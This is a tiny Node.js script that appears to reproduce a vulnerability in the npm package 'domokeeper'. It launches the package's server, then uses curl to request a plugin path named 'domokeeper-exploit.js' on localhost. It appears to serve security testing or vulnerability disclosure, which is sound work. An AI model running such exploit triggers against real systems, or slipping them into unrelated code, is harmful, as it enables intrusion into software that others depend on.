const exec = require("child_process").exec;
exec("./node_modules/domokeeper/bin.js");
setTimeout(function () {
  exec("curl http://localhost:43569/plugins/domokeeper-exploit.js", () => {
    process.exit(1);
  });
}, 1000);
